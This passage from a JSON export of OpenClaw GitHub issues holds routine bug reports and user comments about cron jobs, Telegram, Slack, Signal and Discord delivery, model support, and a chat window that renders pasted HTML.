`resolveSlackThreadHistory()`)\n\nWhen `isNewSession=true`, the full `sessionCtx` (including `InboundHistory`) is passed to `buildInboundUserContextPrefix()`. The `isNewSession` guard on `threadContextNote` correctly limits thread history to new sessions, but does NOT suppress `InboundHistory`.\n\nThe duplication only occurs on the **first turn** of a new thread session (not on every turn), because:\n- Thread history is only injected when `isNewSession=true`\n- `clearHistoryEntriesIfEnabled()` clears pending history after each reply\n\n## Possible fix\n\nSuppress `InboundHistory` when `ThreadHistoryBody` is present, since thread history from the Slack API is a strict superset of pending history (it includes all recent thread messages, not just those since the last reply):\n\n```typescript\n// In get-reply-run.ts, around line 209:\nconst inboundUserContext = buildInboundUserContextPrefix(\n  isNewSession\n    ? { ...sessionCtx, InboundHistory: threadHistoryBody ? undefined : sessionCtx.InboundHistory }\n    : { ...sessionCtx, ThreadStarterBody: undefined },\n);\n```\n\n## Environment\n\n- OpenClaw version: 2026.2.9\n- Channel: Slack (affects any channel with thread history enabled)\n\n## Logs or screenshots\n\nSession JSONL inspection confirmed 2 instances of overlapping content across 25+ sessions examined.\n\n✍️ Author: Claude Code with @carrotRakko (AI-written, human-approved)",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13912",
      "createdAt": "2026-02-11T06:31:13Z",
      "updatedAt": "2026-02-11T07:32:44Z",
      "author": "carrotRakko",
      "labels": [],
      "taxonomy": {
        "channels": [
          "slack"
        ],
        "platforms": [],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3882811341,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13912#issuecomment-3882811341",
          "createdAt": "2026-02-11T07:32:44Z",
          "updatedAt": "2026-02-11T07:32:44Z",
          "author": "carrotRakko",
          "body": "## Update: fix depends on #7610\n\nThe `ThreadHistoryBody` field (and the thread history injection in `get-reply-run.ts`) is introduced by #7610, which is currently open. This means:\n\n- This bug will manifest once #7610 is merged\n- The fix should be included in #7610 to prevent the duplication from ever reaching main\n\nI've posted a suggested fix as a comment on #7610: https://github.com/openclaw/openclaw/pull/7610#issuecomment-3882810787\n\n✍️ Author: Claude Code with @carrotRakko (AI-written, human-approved)"
        }
      ]
    },
    {
      "number": 13927,
      "title": "[Bug]: One-shot (at) cron job retries indefinitely on delivery error instead of disabling",
      "body": "## Bug Description\n\nOne-shot `at` cron jobs with `deleteAfterRun: true` retry indefinitely when delivery fails, instead of disabling after the first terminal run.\n\n## Version\n\nopenclaw 2026.2.6\n\n## Steps to Reproduce\n\n1. Create a one-shot `at` cron job with `agentTurn` + `sessionTarget: \"isolated\"`\n2. Set delivery target to a bare Discord channel ID (e.g. `\"to\": \"1234567890\"`) — without the `channel:` prefix\n3. Wait for the scheduled time\n\n## Expected Behavior\n\nPer the documentation: *\"One-shot (at) jobs disable after a terminal run (ok, error, or skipped) and do not retry.\"*\n\nThe job should run once, fail delivery with \"Ambiguous Discord recipient\", mark as error (terminal), and disable/delete.\n\n## Actual Behavior\n\nThe job runs repeatedly. In our case it ran **15 times** in ~25 minutes, each time:\n- The `agentTurn` executes successfully (spawns an isolated agent session, burns tokens)\n- Delivery fails with: `Error: Ambiguous Discord recipient \"1234567890\". Use \"user:1234567890\" for DMs or \"channel:1234567890\" for channel messages.`\n- `deleteAfterRun` does not trigger\n- Job fires again almost immediately\n\nAll 15 runs show `status: \"error\"` with the same delivery error and the same `nextRunAtMs`.\n\n## Impact\n\nThis burns significant LLM API tokens. Each retry spawns a full agent turn (in our case, 300s timeout each). 15 retries × agent turn cost adds up fast.\n\n## Workaround\n\nSet `delivery.bestEffort: true` — this makes delivery errors non-fatal, so the job counts as successful and `deleteAfterRun` triggers properly.\n\n## Suggested Fix\n\nDelivery errors on `at` jobs should be treated as terminal — the job should disable after the first failed delivery attempt, regardless of `bestEffort` setting. The current behavior contradicts the documentation.",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13927",
      "createdAt": "2026-02-11T07:15:40Z",
      "updatedAt": "2026-02-11T07:31:16Z",
      "author": "ujean-byte",
      "labels": [],
      "taxonomy": {
        "channels": [
          "discord"
        ],
        "platforms": [],
        "components": []
      },
      "commentsData": [
        {
          "id": 3882806268,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13927#issuecomment-3882806268",
          "createdAt": "2026-02-11T07:31:16Z",
          "updatedAt": "2026-02-11T07:31:16Z",
          "author": "ujean-byte",
          "body": "## Reproduction Confirmed\n\nJust reproduced on 2026.2.6 with a minimal test:\n\n**Setup:** One-shot `at` job, `agentTurn` payload = \"Reply with exactly: test complete\", `timeoutSeconds: 30`, delivery target = bare Discord channel ID (no `channel:` prefix), no `bestEffort`.\n\n**Result:** **~140 runs in 5 minutes** (~2 seconds per cycle). The job retried continuously until manually deleted via `cron remove`.\n\nEach cycle: agent turn completes → output \"test complete\" → delivery fails with \"Ambiguous Discord recipient\" → immediate retry (no backoff).\n\nThis is much worse than initially reported (15 runs was with a heavier payload that took longer per run). With a lightweight payload, it can do ~30 runs/minute indefinitely."
        }
      ]
    },
    {
      "number": 13939,
      "title": "[Bug]: Bug report: Cron reminder systemEvent not delivered to Telegram channel",
      "body": "\nSubject: Bug report: Cron reminder systemEvent not delivered to Telegram channel\n\nBody:\n\nHi OpenClaw team,\n\nI’d like to report a bug with cron-based reminders: the systemEvent fires internally, but nothing is delivered to the user’s Telegram chat.\n\nEnvironment\n\n• Device: Synology DS920+ (Linux 4.4.x)\n• Install: npm i -g openclaw\n• Gateway run: openclaw gateway (configured to auto-start via DSM)\n• Versions:  • Previous: 2026.2.6-3\n  • Current: 2026.2.9 (auto-updated on 2026‑02‑11 09:00 KST via npm i -g openclaw@latest)\n\n• Channel: Telegram DM (single user)\n\nBug summary\n\nA one‑shot cron reminder using payload.kind = \"systemEvent\" executes once (visible as a system message), but no message appears in the bound Telegram chat. From the user’s perspective, the reminder never fires.\n\nPreviously (2026.2.6-3), similar reminders would spam systemEvent thousands of times, but still nothing showed up in Telegram. After updating to 2026.2.9, the over-execution seems fixed (runs once), but it is still not surfaced to the channel.\n\n\nReproduction steps\n\n1. In the main session that’s wired to Telegram, create a one‑shot cron job like this:\n{\n  \"name\": \"[TEST] single text reminder - 2026-02-11 15:45 KST\",\n  \"schedule\": { \"kind\": \"at\", \"at\": \"2026-02-11T06:45:00Z\" },\n  \"sessionTarget\": \"main\",\n  \"payload\": {\n    \"kind\": \"systemEvent\",\n    \"text\": \"[reminder][test] It is 15:45. This is the \\\"[test] single reminder\\\" you asked for.\"\n  },\n  \"deleteAfterRun\": true\n}\n\n2. Wait until 2026‑02‑11 15:45 KST.\n3. Observe:\n• In the session’s system messages / logs:System: [2026‑02‑11 15:45:00 GMT+9]\n[reminder][test] It is 15:45. This is the \"[test] single reminder\" you asked for.\n\n• In the Telegram chat for the same session:\nno message appears. The user never sees the reminder.\nSo the cron → systemEvent pipeline is firing, but the event is not being forwarded to the actual channel.\n\n\nExpected behavior\n\nFor a cron job with:\n\n• sessionTarget: \"main\"\n• payload.kind: \"systemEvent\"\nin a session that is bound to Telegram, I would expect the systemEvent.text to be delivered as a visible message in the Telegram chat (ideally exactly once for a one‑shot reminder).\n\n\nActual behavior\n\n• On 2026.2.9:  • The job executes exactly once at the scheduled time (systemEvent appears once in logs).\n  • No corresponding message is sent to Telegram.\n\n• On 2026.2.6-3:  • Similar jobs executed thousands of times as systemEvents (cron bug),\n  • but none of those reminders appeared in Telegram either.\n\nIt looks like systemEvent reminders for sessionTarget: \"main\" are currently internal-only and not surfaced to the bound channel.\n\nIf you need any more logs or exact cron job definitions, I’m happy to provide them.\n\nThanks!",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13939",
      "createdAt": "2026-02-11T07:29:44Z",
      "updatedAt": "2026-02-11T07:29:44Z",
      "author": "djembekr",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "config"
        ]
      }
    },
    {
      "number": 13937,
      "title": "[Bug]: Posting html in Openclaw Control Gateway not escaped",
      "body": "## Summary\n\nWhat went wrong? When posting contents of a html file to report an error it runs the html in the chat.\n\n## Steps to reproduce\n\n1.Post any html into the chat prompt IE:<!DOCTYPE HTML>\n<html lang=\"en\">\n    <head>\n        <meta charset=\"utf-8\">\n        <title>Error response</title>\n    </head>\n    <body>\n        <h1>Error response</h1>\n        <p>Error code: 404</p>\n        <p>Message: File not found.</p>\n        <p>Error code explanation: 404 - Nothing matches the given URI.</p>\n    </body>\n</html>\n2.\n3.\n\n## Expected behavior\n\nWhat did you expect to happen? Html to be posted as plain text. Not to be executed by the browser/chat window\n\n## Actual behavior\n\nWhat actually happened? As per issue and screenshot\n\n## Environment\n\n- Clawdbot version: 2026.2.9\n- OS: ubuntu server 24.04.03\n- Install method (pnpm/npx/docker/etc):npx\n\n## Logs or screenshots\n\nPaste relevant logs or add screenshots (redact secrets).\n\n<img width=\"532\" height=\"310\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/d67659eb-4eaa-4f62-8166-9d22ae058556\" />",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13937",
      "createdAt": "2026-02-11T07:28:49Z",
      "updatedAt": "2026-02-11T07:28:49Z",
      "author": "EpicRoot",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux",
          "docker"
        ],
        "components": [
          "gateway"
        ]
      }
    },
    {
      "number": 13936,
      "title": "[Bug]: openclaw plugins install fails on Windows with spawn EINVAL",
      "body": "## Summary\nRunning `openclaw plugins install <package>` on Windows fails with a `spawn EINVAL` error. This occurs because the internal call to `spawn` (targeting `npm.cmd`) does not use `{ shell: true }`, which is required on Windows for executing shell scripts/batch files.\n\n## Steps to reproduce\n1. Run OpenClaw on Windows.\n2. Attempt to install any plugin: `openclaw plugins install @m1heng-clawd/feishu`.\n3. Observe the error: `Failed to start CLI: Error: spawn EINVAL`.\n\n## Expected behavior\nThe plugin should be successfully downloaded and installed via NPM.\n\n## Diagnostic Logs & Proof\nI verified this by running a standalone script on the affected machine:\n```javascript\nconst { spawn } = require('child_process');\n// This fails on Windows:\nspawn('npm.cmd', ['-v']).on('error', console.log); \n\n// This succeeds:\nspawn('npm', ['-v'], { shell: true }).on('data', d => console.log(d.toString()));\n```\n\n## Environment\n- **Clawdbot version:** 2026.2.9\n- **OS:** Windows_NT 10.0.20348 (x64)\n- **Node version:** v24.13.1\n- **NPM version:** 11.8.0\n\n## Additional Context\nThis is an **AI-assisted bug report**. The issue was traced to the `installPluginFromNpmSpec` function in `openclaw/dist/installs-DNzuaAfs.js`.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13936",
      "createdAt": "2026-02-11T07:27:54Z",
      "updatedAt": "2026-02-11T07:27:54Z",
      "author": "chinatsu1124",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "windows"
        ],
        "components": [
          "websocket"
        ]
      }
    },
    {
      "number": 13765,
      "title": "[Bug]: Google Antigravity ULTRA users cannot use Opus models (Opus 4.6 required)",
      "body": "## Summary\nGoogle Antigravity ULTRA users are unable to use Opus models in OpenClaw.\nGoogle explicitly enforces ULTRA users to use `opus-4.6` and has banned/disabled `opus-4.5` for this tier. However, OpenClaw currently does not seem to support `opus-4.6` (or forces `opus-4.5`), making it impossible for ULTRA users to use any Opus model.\n\n## Steps to reproduce\n1. Use a Google Antigravity ULTRA account.\n2. Try to use the Opus model in OpenClaw.\n3. If configured to use `opus-4.5`: The request is rejected by Google (forbidden for ULTRA users).\n4. If configured to use `opus-4.6`: It fails (likely unsupported or not correctly mapped in OpenClaw).\n\n## Expected behavior\nOpenClaw should support `opus-4.6` to allow Google Antigravity ULTRA users to use Opus models.\n\n## Actual behavior\nULTRA users are deadlocked: `opus-4.5` is disabled by the provider, and `opus-4.6` is not working/supported in OpenClaw.\n\n## Environment\n- **Provider**: Google Antigravity (ULTRA Tier)\n- **Model**: Opus 4.6 / Opus 4.5",
      "state": "open",
      "comments": 4,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13765",
      "createdAt": "2026-02-11T01:04:33Z",
      "updatedAt": "2026-02-11T07:26:53Z",
      "author": "cristhianeccnovo-dotcom",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3881952700,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13765#issuecomment-3881952700",
          "createdAt": "2026-02-11T03:41:26Z",
          "updatedAt": "2026-02-11T03:41:26Z",
          "author": "strakyo",
          "body": "same issue "
        },
        {
          "id": 3882070860,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13765#issuecomment-3882070860",
          "createdAt": "2026-02-11T04:37:41Z",
          "updatedAt": "2026-02-11T04:37:41Z",
          "author": "ninopaul",
          "body": "Same issue here and always a warning can't use "
        },
        {
          "id": 3882122186,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13765#issuecomment-3882122186",
          "createdAt": "2026-02-11T04:55:55Z",
          "updatedAt": "2026-02-11T04:55:55Z",
          "author": "SecurePlugins",
          "body": "Same here with Gemini Pro account.\n\n⚠️ Agent failed before reply: Unknown model: google-antigravity/claude-opus-4-6-thinking.\nLogs: openclaw logs --follow\n\nWhen listing models, it shows\n\n\nModel                                      Input      Ctx      Local Auth  Tags\ngoogle-antigravity/claude-opus-4-6-thin... -          -        -     -     configured,missing"
        },
        {
          "id": 3882792077,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13765#issuecomment-3882792077",
          "createdAt": "2026-02-11T07:26:53Z",
          "updatedAt": "2026-02-11T07:26:53Z",
          "author": "lasoloryan",
          "body": "same"
        }
      ]
    },
    {
      "number": 13934,
      "title": "[Bug]: Telegram Polling twice causing errors",
      "body": " ## Summary\n\n  OpenClaw v2026.2.9 creates duplicate internal Telegram polling loops, causing continuous 409 Conflict errors with exponential backoff\n  delays (up to 30s), resulting in slow/unresponsive Telegram bot performance.\n\n  ## Steps to reproduce\n\n  1. Configure OpenClaw with Telegram channel enabled:\n     ```json\n     \"channels\": {\n       \"telegram\": {\n         \"enabled\": true,\n         \"botToken\": \"<your-bot-token>\",\n         \"dmPolicy\": \"pairing\",\n         \"groupPolicy\": \"allowlist\"\n       }\n     }\n  2. Start the OpenClaw gateway: systemctl --user start openclaw-gateway\n  3. Monitor logs: journalctl --user -u openclaw-gateway -f\n  4. Wait approximately 60 seconds after startup\n\n  Expected behavior\n\n  OpenClaw should start a single Telegram polling loop using grammyjs/runner's getUpdates method. The bot should respond to messages\n  immediately without conflicts.\n\n  Actual behavior\n\n  Within ~60 seconds of startup, OpenClaw begins logging continuous Telegram 409 Conflict errors:\n\n  2026-02-11T07:11:34.012Z [telegram] getUpdates conflict: Call to 'getUpdates' failed! (409: Conflict: terminated by other getUpdates\n  request; make sure that only one bot instance is running); retrying in 2.43s.\n  2026-02-11T07:12:10.174Z [telegram] getUpdates conflict: Call to 'getUpdates' failed! (409: Conflict: terminated by other getUpdates\n  request; make sure that only one bot instance is running); retrying in 4.16s.\n\n  The errors occur every 2-30 seconds with exponential backoff, indicating OpenClaw is creating two concurrent polling loops internally\n  that conflict with each other.\n\n  Evidence this is internal to OpenClaw:\n  - Only one openclaw-gateway process is running (verified with ps aux, pgrep, lsof)\n  - No external processes are polling Telegram (verified by disabling OpenClaw and successfully calling getUpdates manually)\n  - No Telegram webhook is configured (getWebhookInfo returns empty URL)\n  - Only one Telegram account/token is configured\n  - When channels.telegram.enabled is set to false and gateway is restarted, manual getUpdates calls succeed\n  - When re-enabled, 409 errors return within 60 seconds\n\n  Additional observations:\n  - Bonjour/mDNS logs show name conflict resolution, adding \"(2)\" suffix to gateway name/hostname, suggesting OpenClaw may be detecting\n  its own duplicate instance\n\n  Environment\n\n  - OpenClaw version: 2026.2.9 (build d84eb46)\n  - OS: Linux Mint 22.3 (kernel 6.14.0-37-generic)\n  - Install method: npm global install\n  - Node.js: v22.x (based on log output \"default-node22\")\n  - Telegram plugin: enabled\n  - Gateway mode: local (port 18789)\n  - Related config file: ~/.openclaw/openclaw.json\n\n  Workarounds\n\n  1. Disable Telegram polling (temporary):\n  openclaw config set channels.telegram.enabled false\n  systemctl --user restart openclaw-gateway\n  2. Switch to webhook mode (if public URL available):\n  Configure webhook instead of polling in Telegram channel settings\n\n## Logs or screenshots\n\nPaste relevant logs or add screenshots (redact secrets).\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13934",
      "createdAt": "2026-02-11T07:25:40Z",
      "updatedAt": "2026-02-11T07:25:40Z",
      "author": "TheophilusChinomona",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "config"
        ]
      }
    },
    {
      "number": 13933,
      "title": "Don't warn about low context window when explicitly configured by user",
      "body": "## Description\n\nWhen a model's `contextWindow` is explicitly set in the config (e.g., `2048`), OpenClaw still emits a warning:\n\n```\nwarn agent/embedded low context window: ollama/qwen2.5:7b-2k ctx=2048 (warn<32000) source=modelsConfig\n```\n\nThis is misleading because the user deliberately chose this value (e.g., for cheap heartbeat checks with a small local model). The warning implies something is misconfigured when it's intentional.\n\n## Expected Behavior\n\nIf the user has explicitly configured `contextWindow` in their model definition, suppress the low-context warning — the user knows what they're doing.\n\nThe warning should only trigger when the context window is auto-detected or defaulted, not when explicitly set.\n\n## Current Behavior\n\nAny model with `contextWindow < 32000` triggers the warning regardless of whether it was explicitly configured.\n\n## Use Case\n\nUsing `ollama/qwen2.5:7b-2k` with `contextWindow: 2048` deliberately for lightweight heartbeat polling. The model works perfectly for this — the warning is just noise in the logs.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13933",
      "createdAt": "2026-02-11T07:25:06Z",
      "updatedAt": "2026-02-11T07:25:06Z",
      "author": "tsukhani",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13932,
      "title": "[Bug]:",
      "body": "## Summary\n\nWhat went wrong?\n\n## Steps to reproduce\n\n1.\n2.\n3.\n\n## Expected behavior\n\nWhat did you expect to happen?\n\n## Actual behavior\n\nWhat actually happened?\n\n## Environment\n\n- Clawdbot version:\n- OS:\n- Install method (pnpm/npx/docker/etc):\n\n## Logs or screenshots\n\nPaste relevant logs or add screenshots (redact secrets).\n",
      "state": "closed",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13932",
      "createdAt": "2026-02-11T07:23:32Z",
      "updatedAt": "2026-02-11T07:24:27Z",
      "author": "chinatsu1124",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "docker"
        ],
        "components": []
      }
    },
    {
      "number": 13879,
      "title": "Enable block streaming for Signal channel",
      "body": "## Problem\n\nSignal messages are batched and delivered all at once when an agent turn completes, rather than streaming incrementally during the turn. This creates a poor UX where users see no activity during long-running turns, then receive a burst of messages at the end.\n\n## Root Cause\n\nIn `src/channels/dock.ts`, the Signal channel dock entry is missing `blockStreaming: true` in its capabilities:\n\n```typescript\nsignal: {\n  id: \"signal\",\n  capabilities: {\n    chatTypes: [\"direct\", \"group\"],\n    reactions: true,\n    media: true,\n    // Missing: blockStreaming: true\n  },\n  streaming: {\n    blockStreamingCoalesceDefaults: { minChars: 1500, idleMs: 1000 },\n  },\n  // ...\n}\n```\n\nThe `streaming.blockStreamingCoalesceDefaults` config exists but is never used because `blockStreaming` isn't enabled in capabilities.\n\nCompare to Telegram which has it enabled:\n```typescript\ntelegram: {\n  capabilities: {\n    chatTypes: [...],\n    nativeCommands: true,\n    blockStreaming: true,  // ← Messages stream during turn\n  },\n}\n```\n\n## Proposed Fix\n\nAdd `blockStreaming: true` to Signal's capabilities in `src/channels/dock.ts`.\n\n## Testing\n\n- Send a long message that triggers multi-minute agent processing\n- Verify messages arrive incrementally during the turn rather than in a burst at completion\n- Verify coalescing behavior (1500 char min, 1000ms idle) works as expected",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13879",
      "createdAt": "2026-02-11T04:39:05Z",
      "updatedAt": "2026-02-11T07:19:33Z",
      "author": "NOVA-Openclaw",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram",
          "signal"
        ],
        "platforms": [],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3882392599,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13879#issuecomment-3882392599",
          "createdAt": "2026-02-11T05:59:21Z",
          "updatedAt": "2026-02-11T05:59:21Z",
          "author": "0xRaini",
          "body": "This looks like a straightforward one-liner — just add `blockStreaming: true` to the Signal dock capabilities.\n\nThe fix in `src/channels/dock.ts`:\n```diff\nsignal: {\n  id: \"signal\",\n  capabilities: {\n    chatTypes: [\"direct\", \"group\"],\n    reactions: true,\n    media: true,\n+   blockStreaming: true,\n  },\n```\n\nThe streaming config (`blockStreamingCoalesceDefaults`) is already there, it's just not being activated because the capability flag is missing.\n\nI can submit a quick PR for this if you'd like."
        },
        {
          "id": 3882770669,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13879#issuecomment-3882770669",
          "createdAt": "2026-02-11T07:19:33Z",
          "updatedAt": "2026-02-11T07:19:33Z",
          "author": "NOVA-Openclaw",
          "body": "## Additional Bug: Message Truncation at Colons\n\nAfter enabling block streaming, we're observing another Signal channel issue:\n\n### Symptom\nMessages occasionally get truncated at colons. For example:\n- Agent sends: \"Let me fix all of this:\"\n- Expected: Follow-up message with the actual fix\n- Actual: Pause, then an **unrelated** message arrives (likely from the next block)\n\nThe content after the colon appears to be dropped/lost.\n\n### Observations\n- Happens intermittently, not every time\n- There's usually a pause after the truncated message\n- The next message that arrives seems to be from a different context/block\n- Suggests possible race condition in message batching or block coalescing\n\n### Environment\n- Signal via signal-cli JSON-RPC\n- Block streaming enabled\n- Direct messages (not group)\n\nThis may be related to the coalescing logic (`minChars: 1500, idleMs: 1000`) or how message chunks are assembled before sending."
        }
      ]
    },
    {
      "number": 13929,
      "title": "Cron scheduler not firing jobs despite gateway running",
      "body": "## Description\nCron jobs are not executing even though the gateway is running continuously.\n\n## Environment\n- OpenClaw version: Latest npm\n- OS: Windows 10/11\n- Node: v24.13.0\n\n## Steps to Reproduce\n1. Configure cron jobs with various schedules (cron expressions, 'at' times)\n2. Ensure wakeMode is set to 'now' for isolated sessions\n3. Start gateway via Task Scheduler or manually\n4. Wait for scheduled time to pass\n\n## Expected Behavior\nCron jobs should fire at their scheduled times.\n\n## Actual Behavior\nGateway starts and runs continuously (confirmed via logs - web-heartbeat entries every minute from 00:32 through 07:15). Cron scheduler initializes with 'cron: started' log showing jobs loaded. However, no jobs execute when due.\n\n## Evidence from logs\n- 00:32:17 - Gateway starts, cron scheduler shows 25 jobs, nextWakeAtMs set\n- 06:55 - Morning briefing job was scheduled (cron expr: '55 6 * * *', tz: Europe/London, wakeMode: now)\n- 06:50-07:00 - Only web-heartbeat logs appear, no cron execution\n- Job lastRunAtMs shows Saturday Feb 8, meaning it hasn't run since then\n\n## Additional Context\nThis has been happening for multiple days. The gateway is definitely running (responding to WhatsApp messages, heartbeats logging), but the cron execution pipeline appears blocked. The keep-alive cron (hourly, main session, systemEvent) also never executed - no lastRunAtMs in state.\n\nHappy to provide full logs if helpful.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13929",
      "createdAt": "2026-02-11T07:15:47Z",
      "updatedAt": "2026-02-11T07:15:47Z",
      "author": "JuniorVernon",
      "labels": [],
      "taxonomy": {
        "channels": [
          "whatsapp"
        ],
        "platforms": [
          "windows"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 2203,
      "title": "[Bug]: channel exited: Failed to resolve Discord application id",
      "body": "## Summary\nWhat went wrong?\n\n## Steps to reproduce\n1. `clawdbot channels add`\n2. Add a discord bot\n\n## Expected behavior\nShould start listening on Discord\n\n## Actual behavior\nDiscord fails\n\n## Environment\n- Clawdbot version: clawdbot@2026.1.24-3\n- OS: MacOS 15.7.2\n- Install method: npm\n\n## Logs\n12:01:49 [discord] [abi] starting provider\n12:01:53 [discord] [abi] channel exited: Failed to resolve Discord application id\n",
      "state": "closed",
      "comments": 28,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/2203",
      "createdAt": "2026-01-26T12:05:12Z",
      "updatedAt": "2026-02-11T07:13:57Z",
      "author": "Lemocuber",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "discord"
        ],
        "platforms": [
          "macos"
        ],
        "components": []
      },
      "commentsData": [
        {
          "id": 3799311310,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2203#issuecomment-3799311310",
          "createdAt": "2026-01-26T12:23:00Z",
          "updatedAt": "2026-01-26T12:23:00Z",
          "author": "Lemocuber",
          "body": "Solved.\nBelieve it was a temporary issue of Discord API.\n`https://discord.com/api/v10/users/@me` was down for some time\n\nNot-A-Bug"
        },
        {
          "id": 3804163235,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2203#issuecomment-3804163235",
          "createdAt": "2026-01-27T09:45:33Z",
          "updatedAt": "2026-01-27T09:45:33Z",
          "author": "qs-lll",
          "body": "maybe not,  the same issue "
        },
        {
          "id": 3804214973,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2203#issuecomment-3804214973",
          "createdAt": "2026-01-27T09:55:59Z",
          "updatedAt": "2026-01-27T09:55:59Z",
          "author": "YangW796",
          "body": "I have the same issue\n"
        },
        {
          "id": 3804868031,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2203#issuecomment-3804868031",
          "createdAt": "2026-01-27T12:11:25Z",
          "updatedAt": "2026-01-27T12:11:25Z",
          "author": "LIJK20",
          "body": "same issue\n"
        },
        {
          "id": 3807833301,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2203#issuecomment-3807833301",
          "createdAt": "2026-01-27T22:27:32Z",
          "updatedAt": "2026-01-27T22:41:37Z",
          "author": "w84death",
          "body": "was working fine but then I started hardening the secrets and now I got this message too\n\nLooks like using DISCORD_BOT_TOKEN is not working."
        },
        {
          "id": 3808370378,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2203#issuecomment-3808370378",
          "createdAt": "2026-01-28T01:01:06Z",
          "updatedAt": "2026-01-28T01:01:06Z",
          "author": "Feng395",
          "body": "Failed to resolve Discord application id\nProbe failed · This operation was aborted"
        },
        {
          "id": 3808670634,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2203#issuecomment-3808670634",
          "createdAt": "2026-01-28T02:56:37Z",
          "updatedAt": "2026-01-28T02:56:37Z",
          "author": "caopulan",
          "body": "same here"
        },
        {
          "id": 3809551697,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2203#issuecomment-3809551697",
          "createdAt": "2026-01-28T07:41:28Z",
          "updatedAt": "2026-01-28T07:41:28Z",
          "author": "amazing-gao",
          "body": "same here\n\n"
        },
        {
          "id": 3809788812,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2203#issuecomment-3809788812",
          "createdAt": "2026-01-28T08:33:35Z",
          "updatedAt": "2026-01-28T08:33:35Z",
          "author": "wzwei1990",
          "body": "same here"
        },
        {
          "id": 3809797880,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2203#issuecomment-3809797880",
          "createdAt": "2026-01-28T08:35:50Z",
          "updatedAt": "2026-01-28T08:35:50Z",
          "author": "yyong008",
          "body": "same here "
        },
        {
          "id": 3810035143,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2203#issuecomment-3810035143",
          "createdAt": "2026-01-28T09:21:05Z",
          "updatedAt": "2026-01-28T09:21:05Z",
          "author": "davidtty",
          "body": "same here\n"
        },
        {
          "id": 3810059902,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2203#issuecomment-3810059902",
          "createdAt": "2026-01-28T09:26:38Z",
          "updatedAt": "2026-01-28T09:26:38Z",
          "author": "Garfield-Wuu",
          "body": "same here"
        },
        {
          "id": 3811003233,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2203#issuecomment-3811003233",
          "createdAt": "2026-01-28T12:21:01Z",
          "updatedAt": "2026-01-28T12:21:01Z",
          "author": "like9729",
          "body": "same here"
        },
        {
          "id": 3811316517,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2203#issuecomment-3811316517",
          "createdAt": "2026-01-28T13:28:57Z",
          "updatedAt": "2026-01-28T13:28:57Z",
          "author": "cavellpotter",
          "body": "<img width=\"1149\" height=\"512\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/54cff3eb-49c2-4ac8-9bc3-ce24fc6760d5\" />\nsame here"
        },
        {
          "id": 3812751427,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2203#issuecomment-3812751427",
          "createdAt": "2026-01-28T17:28:26Z",
          "updatedAt": "2026-01-28T17:28:26Z",
          "author": "Tweakzx",
          "body": "same here"
        },
        {
          "id": 3813251954,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2203#issuecomment-3813251954",
          "createdAt": "2026-01-28T18:55:41Z",
          "updatedAt": "2026-01-28T18:55:41Z",
          "author": "zevilz",
          "body": "same here"
        },
        {
          "id": 3813896644,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2203#issuecomment-3813896644",
          "createdAt": "2026-01-28T20:57:52Z",
